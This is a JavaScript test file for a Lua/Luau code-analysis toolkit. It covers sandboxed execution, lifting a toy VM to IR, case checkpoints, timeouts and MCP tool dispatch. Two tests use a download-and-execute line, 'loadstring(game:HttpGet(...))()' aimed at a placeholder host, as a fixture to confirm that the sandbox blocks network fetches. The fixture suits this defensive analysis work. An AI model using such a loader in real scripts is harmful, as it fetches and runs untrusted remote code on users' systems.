import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtemp, rm, readFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { luaCall } from './dsh-lua-tools.mjs'
import { mobileDispatchToolCall } from './dsh-mobile-toolbox-mcp.mjs'

const vm='local code={{1,analysis_input},{2,3},{0}} local r={} local pc=1 while true do local ins=code[pc] local op=ins[1] if op==1 then r[1]=ins[2] elseif op==2 then r[1]=r[1]+ins[2] elseif op==0 then return r[1] end pc+=1 end'
test('genuine Luau, VM probes, IR and backward slice',async()=>{
 const typed=await luaCall('lua_dynamic_run',{source:'local x: number=6; return x*7'});assert.equal(typed.result,42)
 const run=await luaCall('lua_dynamic_run',{source:vm,globals:{analysis_input:7},instrument:true});assert.equal(run.ok,true);assert.equal(run.result,10)
 assert.deepEqual(run.events.map(e=>e.pc),[1,2,3])
 const lift=await luaCall('lua_vm_lift',{source:vm,events:run.events,register:'1',atStep:2})
 assert.equal(lift.instructions[1].operations[0].text,'R[1] := (R[1] + 3)');assert.equal(lift.slice.contributors.length,2)
})
test('multi-stage offline capture preserves source and does not request network',async()=>{
 const source='loadstring(game:HttpGet("https://example.test/payload"))()'
 const blocked=await luaCall('lua_dynamic_run',{source});assert.equal(blocked.ok,false);assert.equal(blocked.events[0].fixture,false)
 const run=await luaCall('lua_analysis_workflow',{source,fixtures:{http:{'https://example.test/payload':'return 42'}}})
 assert.equal(run.layers.length,2);assert.equal(run.layers[1].dynamic.result,42)
})
test('case checkpoints, scenarios, baseline comparison and report checksums',async()=>{
 const base=await mkdtemp(join(tmpdir(),'lua-case-'));const caseDir=join(base,'case')
 try{
  await luaCall('lua_case_create',{caseDir,source:vm,scenarios:[{name:'a',globals:{analysis_input:7}},{name:'b',globals:{analysis_input:9}}]})
  const first=await luaCall('lua_case_run',{caseDir,maxTasks:1});assert.equal(first.counts.pending,1);assert.equal(first.tasks[0].summary.validation.equivalentObservedBehavior,true)
  const next=await luaCall('lua_case_run',{caseDir});assert.equal(next.overall,'complete');assert.equal(next.tasks[0].attempts.length,1)
  const comparison=await luaCall('lua_case_compare',{caseDir,baselineScenario:'a',candidateScenario:'b'});assert.equal(comparison.pairs[0].traceComparison.firstDivergence.step,1)
  assert.match(await readFile(comparison.artifacts.report,'utf8'),/存在分歧/)
  assert.equal((await luaCall('lua_case_status',{caseDir,verifyEvidence:true})).integrity,'verified')
 }finally{await rm(base,{recursive:true,force:true})}
})
test('runaway guests time out and retain earlier events',async()=>{
 const run=await luaCall('lua_dynamic_run',{source:'print("before-loop"); while true do end',timeoutMs:2000});assert.equal(run.timedOut,true);assert.equal(run.events[0].text,'before-loop')
})
test('missing fixtures block once, and overrides resume pending layers',async()=>{
 const base=await mkdtemp(join(tmpdir(),'lua-resume-'));const caseDir=join(base,'case')
 try{
  const url='https://example.test/payload';await luaCall('lua_case_create',{caseDir,source:'loadstring(game:HttpGet("'+url+'"))()'})
  assert.equal((await luaCall('lua_case_run',{caseDir})).overall,'blocked')
  assert.deepEqual((await luaCall('lua_case_run',{caseDir})).processed,[])
  const run=await luaCall('lua_case_run',{caseDir,taskOverrides:[{taskId:'t000001',options:{fixtures:{http:{[url]:'return 42'}}}}]});assert.equal(run.overall,'complete')
 }finally{await rm(base,{recursive:true,force:true})}
})
test('MCP discovery and error results remain usable',async()=>{
 const registry=await mobileDispatchToolCall({name:'tool_registry_list',arguments:{}});assert.notEqual(registry.isError,true)
 const good=await mobileDispatchToolCall({name:'lua_vm_analyze',arguments:{source:vm}});assert.equal(good.structuredContent.dispatchers[0].pc,'pc')
 const bad=await mobileDispatchToolCall({name:'lua_vm_analyze',arguments:{source:1}});assert.equal(bad.isError,true)
})
